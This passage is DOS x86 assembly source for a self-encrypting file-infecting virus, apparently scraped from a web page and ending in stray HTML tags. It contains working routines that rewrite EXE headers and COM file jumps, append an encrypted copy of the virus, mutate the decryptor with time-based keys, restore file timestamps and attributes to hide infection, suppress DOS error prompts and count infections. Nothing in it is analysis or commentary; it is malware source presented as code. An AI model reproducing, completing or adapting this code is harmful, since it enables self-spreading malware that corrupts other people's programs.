          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax, heap-decrypt         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          xor  byte ptr [bp+decrypt_loop+2],028h ; flip between add/sub

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

exe_mask            db '*.exe',0
com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point

</textarea></td></tr></table></body></html>
